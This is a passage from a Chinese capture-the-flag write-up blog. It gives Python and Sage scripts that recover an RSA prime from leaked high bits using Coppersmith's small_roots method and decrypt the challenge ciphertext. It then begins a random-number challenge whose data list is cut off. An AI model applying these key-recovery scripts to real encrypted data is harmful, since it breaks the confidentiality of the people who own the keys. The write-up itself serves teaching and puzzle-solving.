class="line">#!/usr/bin/env python3</span><br><span class="line"># gen_candidates.py</span><br><span class="line"># 生成 p_high 候选列表（例如 4096 个）</span><br><span class="line">import argparse, re</span><br><span class="line"></span><br><span class="line">def read_public_key(path=&#x27;public_key.pem&#x27;):</span><br><span class="line">    txt = open(path,&#x27;r&#x27;).read()</span><br><span class="line">    m = re.search(r&quot;n\s*=\s*([0-9]+)&quot;, txt)</span><br><span class="line">    if not m:</span><br><span class="line">        raise RuntimeError(&quot;public_key.pem 中找不到 n&quot;)</span><br><span class="line">    n = int(m.group(1))</span><br><span class="line">    return n</span><br><span class="line"></span><br><span class="line">def read_partial(path=&#x27;partial_p.txt&#x27;):</span><br><span class="line">    s = open(path,&#x27;r&#x27;).read().strip()</span><br><span class="line">    # 去掉前缀(例如 ???)，保留十六进制部分</span><br><span class="line">    hexpart = &#x27;&#x27;.join(ch for ch in s if ch in &quot;0123456789abcdefABCDEF&quot;)</span><br><span class="line">    if hexpart == &#x27;&#x27;:</span><br><span class="line">        raise RuntimeError(&quot;partial_p.txt 看起来没有 hex 内容&quot;)</span><br><span class="line">    return int(hexpart, 16), hexpart</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(&#x27;--mask&#x27;, type=int, default=12, help=&#x27;被 mask 的低位数，默认 12 -&gt; 4096 个候选&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--highbits&#x27;, type=int, default=None, help=&#x27;已知的 high_bit_count (bits)，默认取 p_bits*2/3&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--out&#x27;, default=&#x27;p_high_candidates_full.txt&#x27;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    n = read_public_key()</span><br><span class="line">    partial_int, hexstr = read_partial()</span><br><span class="line"></span><br><span class="line">    p_bits_est = (n.bit_length() + 1)//2</span><br><span class="line">    if args.highbits is None:</span><br><span class="line">        high_bit_count = int(p_bits_est * 2/3)</span><br><span class="line">    else:</span><br><span class="line">        high_bit_count = int(args.highbits)</span><br><span class="line"></span><br><span class="line">    mask_bits = args.mask</span><br><span class="line">    print(&quot;n bits:&quot;, n.bit_length(), &quot;est p bits:&quot;, p_bits_est, &quot;high_bit_count:&quot;, high_bit_count)</span><br><span class="line">    print(&quot;partial hex:&quot;, hexstr)</span><br><span class="line">    print(&quot;mask bits:&quot;, mask_bits, &quot;=&gt; candidates:&quot;, 2**mask_bits)</span><br><span class="line"></span><br><span class="line">    # 解释：partial_int 被视为 p_high_masked（即高位段内低 mask_bits 位未知道或被置0）</span><br><span class="line">    # 我们按照 candidate = partial_int | k (k ranges 0..2^mask_bits-1)</span><br><span class="line">    with open(args.out,&#x27;w&#x27;) as f:</span><br><span class="line">        idx = 0</span><br><span class="line">        for k in range(0, 1&lt;&lt;mask_bits):</span><br><span class="line">            cand = partial_int | k</span><br><span class="line">            f.write(f&quot;&#123;idx&#125; &#123;cand&#125;\\n&quot;)</span><br><span class="line">            idx += 1</span><br><span class="line">    print(&quot;写入&quot;, args.out, &quot;完成。&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再根据高位来复原低位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env sage</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">recover_from_candidates.sage.py</span><br><span class="line"></span><br><span class="line">在 Sage 环境下运行：</span><br><span class="line">sage -python recover_from_candidates.sage.py</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">- 需要文件： public_key.pem, ciphertext.bin, p_high_candidates_full.txt</span><br><span class="line">- p_high_candidates_full.txt 格式示例（每行一个候选）:</span><br><span class="line">  0 1705444444814700337...</span><br><span class="line">  1 6721900954927818992...</span><br><span class="line">  ...</span><br><span class="line">  （第二列为十进制整数表示的 high_p）</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from sage.all import *</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># ---------- 配置（如需可修改） ----------</span><br><span class="line">CANDIDATES_FILE = &quot;p_high_candidates_full.txt&quot;</span><br><span class="line">PUBFILE = &quot;public_key.pem&quot;</span><br><span class="line">CIPHFILE = &quot;ciphertext.bin&quot;</span><br><span class="line"></span><br><span class="line"># mask_bits 将尝试的范围（表示 leaked high block 内低位被 mask 的位数）</span><br><span class="line">MAX_MASK_BITS = 24   # 可按需扩大/缩小</span><br><span class="line"></span><br><span class="line"># beta 参数列表（small_roots 使用）</span><br><span class="line">BETA_LIST = [0.5, 0.45, 0.4, 0.35, 0.3, 0.25, 0.2]</span><br><span class="line"></span><br><span class="line"># 若你知道 high_bit_count（被泄露的高位位数），可在这里指定（整数）；否则设为 None，脚本自动按 p_bits*2/3 估算</span><br><span class="line">KNOWN_HIGH_BIT_COUNT = None</span><br><span class="line"></span><br><span class="line"># ---------- 读取公钥与密文 ----------</span><br><span class="line">def read_public_key(path=PUBFILE):</span><br><span class="line">    txt = open(path,&#x27;r&#x27;).read()</span><br><span class="line">    m = re.search(r&quot;n\s*=\s*([0-9]+)&quot;, txt)</span><br><span class="line">    if not m:</span><br><span class="line">        raise ValueError(&quot;public_key.pem 中找不到 n&quot;)</span><br><span class="line">    n = Integer(int(m.group(1)))</span><br><span class="line">    m2 = re.search(r&quot;e\s*=\s*([0-9]+)&quot;, txt)</span><br><span class="line">    e = int(m2.group(1)) if m2 else 65537</span><br><span class="line">    return n,e</span><br><span class="line"></span><br><span class="line">def read_ciphertext(path=CIPHFILE):</span><br><span class="line">    try:</span><br><span class="line">        b = open(path,&#x27;rb&#x27;).read()</span><br><span class="line">        return Integer(int.from_bytes(b,&#x27;big&#x27;))</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        print(&quot;无法读取 ciphertext.bin：&quot;, ex)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"># ---------- 读取候选 high_p 列表 ----------</span><br><span class="line">def read_candidates(path=CANDIDATES_FILE):</span><br><span class="line">    cand = []</span><br><span class="line">    for line in open(path,&#x27;r&#x27;):</span><br><span class="line">        line = line.strip()</span><br><span class="line">        if not line:</span><br><span class="line">            continue</span><br><span class="line">        parts = line.split()</span><br><span class="line">        if len(parts) &lt; 2:</span><br><span class="line">            continue</span><br><span class="line">        # 第二列可能是十进制，也可能是 hex，先尝试十进制</span><br><span class="line">        token = parts[1]</span><br><span class="line">        try:</span><br><span class="line">            v = Integer(int(token))</span><br><span class="line">        except Exception:</span><br><span class="line">            # 如果包含 0x 或 hex 字符，试 hex</span><br><span class="line">            if token.startswith(&quot;0x&quot;) or all(c in &quot;0123456789abcdefABCDEF&quot; for c in token):</span><br><span class="line">                v = Integer(int(token, 16))</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;无法解析候选:&quot;, token)</span><br><span class="line">                continue</span><br><span class="line">        cand.append((parts[0], v))</span><br><span class="line">    return cand</span><br><span class="line"></span><br><span class="line"># ---------- phase3-style 尝试函数 ----------</span><br><span class="line">def try_recover_from_high(n, high_int, p_bits_est, high_bit_count):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    high_int: 候选的 high_p（整数）</span><br><span class="line">    n: modulus</span><br><span class="line">    p_bits_est: 预估的 p bit 长度</span><br><span class="line">    high_bit_count: 泄露的高位数量（bits）</span><br><span class="line">    返回：recovered_p 或 None</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # 尝试若干 mask_bits（表示 high_int 的低端可能被 mask 的位数）</span><br><span class="line">    for mask_bits in range(0, MAX_MASK_BITS+1):</span><br><span class="line">        known_high = Integer(high_int &gt;&gt; mask_bits)  # 去掉被 mask 的低位</span><br><span class="line">        unknown_bits = p_bits_est - high_bit_count + mask_bits</span><br><span class="line">        if unknown_bits &lt;= 0:</span><br><span class="line">            continue</span><br><span class="line">        X = 2**unknown_bits</span><br><span class="line">        print(f&quot;  mask_bits=&#123;mask_bits&#125;, unknown_bits=&#123;unknown_bits&#125; (search X ~ 2^&#123;unknown_bits&#125;)&quot;)</span><br><span class="line">        # 构造 f(x) = A*2^unknown_bits + x  在 Zmod(n)</span><br><span class="line">        try:</span><br><span class="line">            R = PolynomialRing(Zmod(n), &#x27;x&#x27;)</span><br><span class="line">            x = R.gen()</span><br><span class="line">            A = Integer(known_high)</span><br><span class="line">            f = A * (2**unknown_bits) + x</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&quot;  Polynomial construction error:&quot;, e)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        # 尝试不同 beta</span><br><span class="line">        for beta in BETA_LIST:</span><br><span class="line">            try:</span><br><span class="line">                t0 = time.time()</span><br><span class="line">                print(f&quot;    trying small_roots with beta=&#123;beta&#125; ...&quot;, end=&quot;&quot;, flush=True)</span><br><span class="line">                roots = f.small_roots(X=X, beta=beta)</span><br><span class="line">                t1 = time.time()</span><br><span class="line">                print(&quot; done (time: &#123;:.2f&#125;s)&quot;.format(t1-t0))</span><br><span class="line">                if not roots:</span><br><span class="line">                    # no roots for this param</span><br><span class="line">                    continue</span><br><span class="line">                # 遍历 roots</span><br><span class="line">                for r in roots:</span><br><span class="line">                    r_int = Integer(r)</span><br><span class="line">                    P = Integer(A * (2**unknown_bits) + r_int)</span><br><span class="line">                    if P &lt;= 1:</span><br><span class="line">                        continue</span><br><span class="line">                    if n % P == 0:</span><br><span class="line">                        Q = n // P</span><br><span class="line">                        if P * Q == n:</span><br><span class="line">                            print(&quot;    -&gt; success: found p!&quot;)</span><br><span class="line">                            return int(P)</span><br><span class="line">                        else:</span><br><span class="line">                            print(&quot;    found factor but P*Q != n (skip)&quot;)</span><br><span class="line">                # 若没有合适因子，继续</span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(&quot;    small_roots raised:&quot;, e)</span><br><span class="line">                # 继续尝试其他 beta</span><br><span class="line">                continue</span><br><span class="line">    # 未找到</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"># ---------- 主流程 ----------</span><br><span class="line">def main():</span><br><span class="line">    print(&quot;读取 public key...&quot;)</span><br><span class="line">    try:</span><br><span class="line">        n,e = read_public_key()</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        print(&quot;读取 public key 失败：&quot;, ex)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 兼容 Sage Integer 与 Python int 的 bitlen 调用</span><br><span class="line">    def bitlen(x):</span><br><span class="line">        try:</span><br><span class="line">            return int(x).bit_length()</span><br><span class="line">        except Exception:</span><br><span class="line">            try:</span><br><span class="line">                return x.nbits()</span><br><span class="line">            except Exception:</span><br><span class="line">                return len(bin(int(x))) - 2</span><br><span class="line"></span><br><span class="line">    print(&quot;n bitlen:&quot;, bitlen(n))</span><br><span class="line">    c = read_ciphertext()</span><br><span class="line">    if c is None:</span><br><span class="line">        print(&quot;注意：未读到 ciphertext，脚本将只尝试恢复 p 并不会解密。&quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;读取 high_p 候选列表...&quot;)</span><br><span class="line">    candidates = read_candidates()</span><br><span class="line">    if not candidates:</span><br><span class="line">        print(&quot;没有候选，检查文件&quot;, CANDIDATES_FILE)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    p_bits_est = (bitlen(n) + 1)//2</span><br><span class="line">    if KNOWN_HIGH_BIT_COUNT is None:</span><br><span class="line">        high_bit_count = int(p_bits_est * 2/3)</span><br><span class="line">    else:</span><br><span class="line">        high_bit_count = int(KNOWN_HIGH_BIT_COUNT)</span><br><span class="line"></span><br><span class="line">    print(f&quot;估计 p bits: &#123;p_bits_est&#125;, 使用 high_bit_count = &#123;high_bit_count&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 遍历候选</span><br><span class="line">    idx = 0</span><br><span class="line">    for label, high_val in candidates:</span><br><span class="line">        idx += 1</span><br><span class="line">        print(&quot;\n================================================================&quot;)</span><br><span class="line">        print(f&quot;[&#123;idx&#125;/&#123;len(candidates)&#125;] candidate label=&#123;label&#125;  high_val bitlen=&#123;bitlen(high_val)&#125;&quot;)</span><br><span class="line">        try:</span><br><span class="line">            recovered_p = try_recover_from_high(n, high_val, p_bits_est, high_bit_count)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&quot;  candidate 流程异常：&quot;, e)</span><br><span class="line">            recovered_p = None</span><br><span class="line"></span><br><span class="line">        if recovered_p:</span><br><span class="line">            P = Integer(recovered_p)</span><br><span class="line">            Q = Integer(n) // P</span><br><span class="line">            print(&quot;&gt;&gt;&gt; 成功恢复 p:&quot;, P)</span><br><span class="line">            print(&quot;&gt;&gt;&gt; 对应 q:&quot;, Q)</span><br><span class="line">            # 尝试解密</span><br><span class="line">            if c is not None:</span><br><span class="line">                print(&quot;尝试解密 ciphertext...&quot;)</span><br><span class="line">                try:</span><br><span class="line">                    phi = (P-1)*(Q-1)</span><br><span class="line">                    d = inverse_mod(Integer(e), phi)</span><br><span class="line">                    m = pow(Integer(c), Integer(d), Integer(n))</span><br><span class="line">                    try:</span><br><span class="line">                        pt = long_to_bytes(int(m))</span><br><span class="line">                        print(&quot;Decrypted plaintext (bytes):&quot;)</span><br><span class="line">                        print(pt)</span><br><span class="line">                        try:</span><br><span class="line">                            print(&quot;Decoded (utf-8):&quot;, pt.decode())</span><br><span class="line">                        except Exception:</span><br><span class="line">                            pass</span><br><span class="line">                    except Exception as ex:</span><br><span class="line">                        print(&quot;解密后转换 bytes 失败：&quot;, ex)</span><br><span class="line">                        print(&quot;m (hex):&quot;, hex(int(m)))</span><br><span class="line">                except Exception as ex:</span><br><span class="line">                    print(&quot;解密失败：&quot;, ex)</span><br><span class="line">            print(&quot;Done. Exiting.&quot;)</span><br><span class="line">            return</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;  未从该候选恢复到 p，继续下一个候选。&quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;\n遍历完所有候选，未能恢复 p。建议：\n - 增加 MAX_MASK_BITS 或调整 BETA_LIST\n - 在交互式 Sage 中对单个候选细调 small_roots 参数\n - 检查候选列表是否确实为 high_p（是否需要右移/左移）\n&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拼接后flag自然也出来了<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="55.png" alt="55"></p>
<h3 id="随机数之旅3"><a href="#随机数之旅3" class="headerlink" title="随机数之旅3"></a>随机数之旅3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 导入数据</span><br><span class="line">p = 5323</span><br><span class="line">A_list = [(5264, 4296, 3438, 4717, 3154, 4628, 4488, 3442, 5197, 4464, 4449, 3242, 3931, 3947, 5167, 4486, 4780, 4256, 3154, 5063, 2810, 4761, 5207, 3105, 5149, 4803, 4990, 3078, 3826, 5238, 4753, 4021, 3590, 3510, 2931, 4065, 3508, 3691, 4810, 3493, 3773, 3069), (4419, 3578, 4420, 4692, 4344, 4184, 3843, 3494, 3168, 3788, 3094, 5314, 3480, 4739, 2683, 4045, 4338, 4652, 5221, 5191, 2833, 3183, 2781, 4339, 4433, 2992, 4964, 4866, 3100, 3624, 4956, 3989, 5149, 3955, 4338, 5265, 2952, 5142, 4898, 4499, 4615, 2797), (3274, 4484, 3339, 4842, 3842, 2892, 2741, 3756, 2861, 3817, 4146, 4887, 2703, 4618, 4984, 2805, 3334, 2932, 3094, 4532, 4424, 4568, 4927, 5008, 2814, 3385, 3850, 3437, 3449, 3290, 5191, 3980, 5290, 3043, 5288, 2704, 3147, 5084, 4560, 2781, 2950, 4753), (3565, 3536, 4814, 3977, 4844, 4833, 2806, 3976, 4889, 3908, 3359, 3611, 2983, 4719, 3170, 4019, 4594, 5182, 4493, 4861, 3999, 2680, 3883, 5290, 4436, 4426, 4885, 4521, 3019, 3237, 5249, 3236, 5303, 4536, 4090, 4463, 2919, 2879, 2771, 4255, 5148, 5156), (2974, 2716, 2782, 3667, 4443, 4289, 3230, 4157, 3876, 4763, 5021, 3268, 4278, 3385, 2765, 5082, 3965, 3557, 2708, 4709, 3125, 4673, 4783, 5029, 3430, 5235, 3919, 3576, 3449, 4861, 3207, 2667, 3942, 3597, 4185, 3759, 5253, 4940, 4256, 2845, 4391, 2750), (5252, 5292, 2822, 4063, 4116, 4065, 3913, 5198, 3856, 3419, 4209, 4900, 3700, 3107, 3998, 5141, 5052, 4370, 3366, 4134, 3461, 3947, 4497, 2980, 5143, 2836, 2914, 4600, 5205, 3041, 3834, 3544, 3682, 2677, 4514, 4327, 4638, 4028, 4971, 3528, 2773, 5043), (3491, 5181, 2922, 3106, 4734, 3657, 3134, 3242, 2959, 5187, 3513, 4099, 4495, 5100, 2945, 5172, 3772, 4409, 3645, 5260, 2663, 2702, 4673, 5263, 3215, 3953, 4123, 3230, 3402, 4822, 3303, 3746, 3892, 4547, 2696, 4139, 3736, 4689, 3320, 4682, 5166, 4576), (3594, 4405, 3032, 4297, 4906, 4383, 3846, 3850, 3210, 3923, 5280, 4643, 4588, 4397, 5134, 3848, 3660, 4770, 3930, 3808, 4509, 5044, 4123, 4757, 4481, 4290, 4140, 3052, 4557, 3626, 3181, 2690, 5279, 3532, 3497, 3214, 4057, 4170, 3153, 3123, 4536, 3958), (4613, 5247, 5279, 3239, 3517, 2809, 3104, 3318, 2771, 4262, 5069, 4399, 4874, 3019, 5034, 4723, 4653, 5047, 5087, 2730, 4602, 2727, 4068, 3055, 4450, 2809, 2760, 3009, 3911, 4485, 2775, 5029, 2816, 4692, 4979, 2732, 3762, 3670, 3850, 3345, 5215, 3151), (3481, 4331, 3840, 5102, 3411, 3530, 4300, 3529, 4067, 4727, 4234, 3191, 4643, 5132, 4380, 4498, 3533, 4896, 3008, 2947, 3395, 2804, 4232, 3425, 3888, 3177, 5120, 3047, 2830, 4352, 3929, 3668, 5209, 2906, 3280, 5093, 4563, 2806, 4851, 3216, 4857, 4032), (4850, 3824, 2777, 3998, 5257, 4238, 3490, 2867, 5129, 2869, 4865, 4224, 3844, 3238, 5154, 3970, 4250, 4099, 3271, 4750, 5181, 4086, 3696, 3335, 3562, 4822, 5137, 4046, 3976, 3663, 4244, 3678, 4761, 3634, 4001, 4417, 4324, 4158, 4384, 3682, 5313, 4052), (4973, 5109, 3841, 3854, 4886, 4200, 5250, 3172, 4677, 4518, 3633, 2742, 3187, 2804, 4649, 4945, 4480, 3701, 3966, 2839, 3503, 2814, 4071, 4624, 2812, 4362, 2986, 3544, 5129, 4687, 4474, 3115, 3936, 5168, 4478, 3970, 3361, 4437, 3226, 2986, 4806, 3652), (4941, 4951, 3618, 3904, 5054, 3596, 4032, 3850, 5117, 3372, 4125, 3333, 3848, 5225, 4780, 4097, 4544, 2861, 3576, 4935, 3871, 3949, 3707, 4129, 5187, 4692, 3177, 5147, 2666, 4823, 4435, 3578, 2929, 2707, 4595, 3938, 2850, 5212, 5240, 3860, 3283, 5259), (3664, 3915, 5206, 2996, 3344, 4880, 4678, 4995, 3521, 3772, 3508, 3860, 4188, 5132, 2712, 3390, 3435, 4608, 3075, 3393, 4593, 3120, 5100, 3087, 3027, 5188, 5026, 4209, 4270, 2842, 2788, 4285, 2878, 3225, 2693, 4212, 2867, 4446, 4595, 4961, 4939, 2998), (4628, 3052, 2878, 4527, 2915, 4819, 3100, 3224, 3877, 3999, 4700, 4824, 4255, 4802, 4334, 4161, 4111, 4861, 4883, 4278, 2665, 2880, 4219, 4705, 4511, 4320, 3875, 3156, 4906, 4754, 4083, 2716, 3573, 3252, 4216, 2778, 3439, 4765, 3618, 5315, 4561, 3499), (4853, 4733, 5289, 4087, 5051, 4808, 5264, 4996, 3673, 4609, 4727, 4774, 4221, 3050, 5050, 4768, 4192, 3998, 2855, 4058, 3899, 3687, 4249, 2733, 3980, 2702, 4089, 3729, 4351, 4872, 3572, 4156, 4186, 3062, 4156, 5188, 3758, 3660, 4650, 3538, 4063, 3598), (3993, 4550, 4516, 4220, 3025, 3134, 2713, 3461, 4284, 4153, 4541, 3514, 4184, 5286, 4209, 4787, 4166, 3551, 2985, 4639, 2867, 3944, 4185, 3014, 2782, 3325, 4989, 3147, 4528, 2772, 2912, 4452, 4634, 5211, 2897, 5207, 4454, 4685, 4227, 4878, 4643, 2788), (3563, 4874, 3399, 3488, 4253, 4172, 4353, 4562, 3074, 5272, 2784, 3724, 3394, 2858, 3180, 4594, 3763, 3392, 4707, 4607, 3394, 3623, 4323, 4294, 4775, 4004, 2977, 3669, 3618, 3311, 4171, 4904, 4001, 3548, 5118, 4847, 4722, 3125, 4605, 3717, 2687, 3679), (4736, 2904, 4535, 4415, 3471, 4198, 4433, 2944, 2952, 3160, 4346, 5281, 2850, 4921, 3807, 4245, 2693, 4369, 4898, 3222, 4052, 5123, 4128, 4014, 3901, 3339, 4862, 5210, 3955, 3925, 3472, 3298, 4158, 2818, 4865, 4910, 3617, 3276, 3818, 4303, 3824, 4572), (4415, 3388, 4882, 4396, 4382, 4921, 3815, 2950, 3251, 3710, 5215, 4841, 3678, 4603, 5191, 3291, 3570, 3436, 5089, 5269, 3887, 3444, 4001, 4397, 3430, 3886, 3676, 5149, 2746, 3828, 3607, 4170, 4152, 4640, 4162, 2868, 2719, 3923, 3156, 4324, 3108, 3722), (3912, 4206, 4036, 5031, 3316, 3080, 3385, 5003, 4397, 4493, 4568, 4130, 3089, 4697, 4599, 3019, 3126, 2830, 4186, 3969, 3103, 2911, 2991, 3332, 2703, 4581, 5276, 3040, 4687, 4033, 4304, 5304, 4976, 3765, 2957, 4005, 3138, 3876, 4032, 3132, 3415, 3465), (4971, 3562, 3942, 2905, 5078, 4273, 5246, 3042, 5171, 4607, 3948, 3894, 2730, 2896, 4641, 3378, 4384, 5053, 4187, 3194, 4581, 3971, 4181, 4413, 4599, 3716, 3531, 3742, 3806, 2979, 4113, 4373, 4766, 3543, 4707, 4592, 4421, 4381, 4084, 4732, 4026, 2859), (3824, 3663, 3807, 4580, 4447, 4273, 5123, 3645, 5235, 3410, 3512, 3041, 3410, 4076, 3435, 4001, 4681, 3327, 5258, 4796, 4517, 4925, 3909, 4947, 4439, 4350, 2912, 4664, 4546, 3248, 2982, 4513, 4684, 3132, 4555, 5013, 5026, 5118, 5002, 2840, 4668, 2794), (4249, 2838, 3901, 4952, 5191, 4488, 2675, 3402, 2960, 5295, 3414, 4005, 2661, 4406, 2897, 4562, 4784, 3897, 3663, 2925, 4140, 4584, 4128, 4100, 4740, 3539, 5072, 3651, 3723, 2859, 4691, 4858, 3944, 4309, 4199, 3455, 3140, 3562, 4720, 3588, 3773, 3197), (5285, 3168, 3069, 3043, 2733, 4718, 3316, 5162, 3063, 3709, 3669, 3959, 4490, 4556, 4345, 5129, 3512, 4102, 3488, 4643, 3759, 4990, 2683, 2920, 5316, 3644, 2913, 4571, 3323, 3203, 3424, 3992, 3701, 5296, 3507, 4301, 4594, 3823, 3582, 4627, 2964, 4961), (3620, 4130, 5092, 5322, 2817, 3743, 4045, 4649, 4371, 4154, 4407, 2673, 4248, 3901, 4507, 4607, 5281, 5246, 4644, 4811, 2805, 4728, 4215, 2964, 4282, 3962, 3925, 4049, 5075, 3238, 2813, 5027, 3716, 3187, 3277, 3953, 4700, 2693, 4490, 5297, 3233, 2721), (5051, 4362, 3937, 3200, 3230, 4123, 4992, 3668, 5129, 3010, 3311, 4105, 3569, 4993, 3955, 4322, 3328, 2848, 4556, 3681, 3243, 4353, 5026, 5320, 3814, 4000, 3521, 3092, 2670, 4678, 4752, 3547, 4948, 3619, 5038, 2999, 3710, 2885, 3187, 3727, 4749, 4574), (3704, 3785, 3684, 4232, 4826, 3147, 3478, 3369, 5043, 4750, 4371, 4925, 3644, 3257, 4108, 5196, 4411, 4658, 3884, 3942, 4161, 3449, 2788, 4513, 3249, 3347, 3806, 2753, 2805, 4035, 4859, 3553, 4001, 